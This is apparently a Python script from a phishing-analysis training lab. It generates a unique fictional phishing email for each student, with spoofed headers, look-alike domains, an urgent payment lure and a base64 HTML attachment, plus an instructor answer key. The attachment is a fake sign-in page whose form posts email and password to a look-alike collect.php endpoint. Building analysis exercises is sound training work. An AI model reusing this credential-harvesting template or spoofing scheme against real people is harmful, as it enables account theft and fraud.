#!/usr/bin/env python3
"""
Episode 11 per-student phishing-sample generator.
Creates a UNIQUE but internally-consistent phishing .eml + inert HTML attachment
(and an instructor answer sheet) for each student, so no two portfolios match.

Usage:
    python3 generate_sample.py --student "Jane Doe" [--out ./out]

No third-party dependencies. The output is a training artifact: fictional, inert,
uses example/look-alike domains, and is for authorised lab use only.
"""
import argparse, base64, hashlib, os, random, re, datetime

ORIGIN_IPS   = ["185.220.101.47","45.137.21.9","193.239.147.14","91.219.236.18",
                "212.83.46.12","103.75.201.6","5.188.206.19","194.26.29.84"]
SENDER_HOSTS = ["novag-rid-secure.com","novagrid-billing.net","ng-helpdesk.co",
                "novagrid-mail.org","secure-novagrid.com"]
LOGIN_LOOKS  = ["novagrid-m365-login.com","novagrid-portal-auth.com","login-novagrid365.com",
                "novagrid-owa-access.com","m365-novagrid-secure.com"]
REPLY_DOMS   = ["consultant-mail.com","financeteam-mail.com","secure-inbox.co","mail-recovery.net"]
SUBJECTS     = ["[Action Required] Unpaid payment advice pending your approval",
                "Urgent: payment reversal in 12 hours unless authorised",
                "Pending wallet settlement requires CFO sign-off",
                "Final notice: approve outstanding payment advice",
                "Security hold on a NovaGrid payment — action needed"]
AMOUNTS      = ["4,250,000","1,980,500","7,640,000","3,110,750","5,025,300"]
ATTACH_NAMES = ["NovaGrid_Payment_Advice.html","Payment_Advice_Oct.html",
                "NovaGrid_Settlement_Notice.html","Wallet_Statement_Secure.html"]

def slug(s): return re.sub(r"[^a-z0-9]+","-", s.lower()).strip("-")

def build_html(login_domain):
    return f"""<!DOCTYPE html>
<!-- TRAINING ARTIFACT — inert. Fictional. NovaGrid Security Labs Ep11. -->
<html lang="en"><head><meta charset="utf-8"><title>NovaGrid 365 — Sign in</title></head>
<body style="font-family:Segoe UI,Arial,sans-serif;background:#f3f2f1;text-align:center">
  <div style="max-width:360px;margin:80px auto;padding:32px;background:#fff;border:1px solid #ddd">
    <h2>NovaGrid 365</h2>
    <p>Your payment advice is protected. Sign in to view the document.</p>
    <form action="https://{login_domain}/owa/collect.php" method="post">
      <input name="email" placeholder="Email" style="width:90%;padding:8px;margin:6px"><br>
      <input name="password" type="password" placeholder="Password" style="width:90%;padding:8px;margin:6px"><br>
      <button type="submit" style="padding:8px 24px;background:#0067b8;color:#fff;border:0">Sign in</button>
    </form>
  </div>
</body></html>
"""

def build_eml(p, b64):
    return f"""Return-Path: <bounce@{p['sender_host']}>
Delivered-To: chidi.nwosu@novagrid.com
Received: from mx.novagrid.com (localhost [127.0.0.1])
    by mx.novagrid.com with ESMTP id {p['msgid']}; {p['date']}
Received: from mail.{p['sender_host']} (unknown [{p['ip']}])
    by mx.novagrid.com (Postfix) with ESMTPS id {p['msgid'][:5]};
    {p['date']} (WAT)
Authentication-Results: mx.novagrid.com;
    spf=fail (sender IP is {p['ip']}) smtp.mailfrom=it-helpdesk@novagrid.com;
    dkim=none (message not signed);
    dmarc=fail (p=quarantine) header.from=novagrid.com
From: "NovaGrid IT Helpdesk" <it-helpdesk@novagrid.com>
Reply-To: "IT Helpdesk" <helpdesk.novagrid@{p['reply']}>
To: "Chidi Nwosu" <chidi.nwosu@novagrid.com>
Subject: {p['subject']}
Date: {p['date']}
Message-ID: <{p['msgid']}@{p['sender_host']}>
X-Mailer: PHPMailer 6.1 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=_novagrid_boundary_001"

--=_novagrid_boundary_001
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: 7bit

<html><body style="font-family:Arial,sans-serif">
<p>Dear Chidi,</p>
<p>A payment advice of <b>NGN {p['amount']}</b> is pending your approval and will be
reversed in <b>12 hours</b> unless authorised. Review the attached advice or sign in
to the finance portal:</p>
<p><a href="https://{p['login']}/owa/">https://portal.novagrid.com/finance/approve</a></p>
<p>Regards,<br>NovaGrid IT Helpdesk</p>
</body></html>

--=_novagrid_boundary_001
Content-Type: text/html; name="{p['attach']}"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="{p['attach']}"

{b64}
--=_novagrid_boundary_001--
"""

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--student", required=True)
    ap.add_argument("--out", default="./out")
    a = ap.parse_args()
    seed = int(hashlib.sha256(a.student.encode()).hexdigest(), 16)
    rnd = random.Random(seed)
    p = {
        "ip": rnd.choice(ORIGIN_IPS),
        "sender_host": rnd.choice(SENDER_HOSTS),
        "login": rnd.choice(LOGIN_LOOKS),
        "reply": rnd.choice(REPLY_DOMS),
        "subject": rnd.choice(SUBJECTS),
        "amount": rnd.choice(AMOUNTS),
        "attach": rnd.choice(ATTACH_NAMES),
        "msgid": "%X" % rnd.getrandbits(48),
        "date": "Tue, 28 Oct 2026 08:14:04 +0100",
    }
    html = build_html(p["login"])
    sha = hashlib.sha256(html.encode()).hexdigest()
    b64 = base64.b64encode(html.encode()).decode()
    outdir = os.path.join(a.out, slug(a.student))
    os.makedirs(os.path.join(outdir, "data"), exist_ok=True)
    with open(os.path.join(outdir, "data", p["attach"]), "w") as f: f.write(html)
    with open(os.path.join(outdir, "data", "phishing-sample.eml"), "w") as f: f.write(build_eml(p, b64))
    with open(os.path.join(outdir, "_instructor_answers.md"), "w") as f:
        f.write(f"""# Instructor answers — {a.student}

- Origin IP: **{p['ip']}**
- Sender host (Return-Path): **{p['sender_host']}**
- Look-alike sign-in domain: **{p['login']}**
- Reply-To domain: **{p['reply']}**
- Subject: {p['subject']}
- Attachment: **{p['attach']}** (HTML document)
- Attachment SHA-256: **{sha}**
- Auth: SPF fail, DKIM none, DMARC fail (exact-domain spoof of novagrid.com)
""")
    print(f"Generated for {a.student!r} -> {outdir}")
    print(f"  IP={p['ip']}  login={p['login']}  attach={p['attach']}")
    print(f"  SHA-256={sha}")

if __name__ == "__main__":
    main()
